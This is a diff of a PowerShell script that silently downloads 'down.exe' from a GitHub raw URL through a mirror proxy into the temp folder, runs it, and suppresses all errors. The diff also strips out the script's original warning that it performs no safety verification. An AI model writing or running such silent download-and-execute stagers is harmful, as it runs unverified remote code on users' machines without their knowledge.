@@ -1,17 +1,8 @@
-# 静默下载运行脚本 (无验证、无回显版)
-# 警告：此脚本无安全验证，请确保您完全信任目标文件。
-
 # 1. 定义原始文件地址和加速站前缀
 $原始链接 = "https://raw.githubusercontent.com/royckk/RE2/main/down.exe"
 $加速站前缀 = "https://g.110777.xyz/"
-
-# 2. 组合成加速后的链接
 $加速链接 = $加速站前缀 + $原始链接
-
-# 3. 定义本地临时文件路径
 $本地路径 = "$env:TEMP\down.exe"
-
-# 4. 静默下载文件
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $加速链接 -OutFile $本地路径 -UseBasicParsing -ErrorAction Stop
@@ -19,8 +10,6 @@ try {
     # 发生错误时静默退出
     exit 1
 }
-
-# 5. 静默运行下载的程序
 try {
     & $本地路径
     exit 0
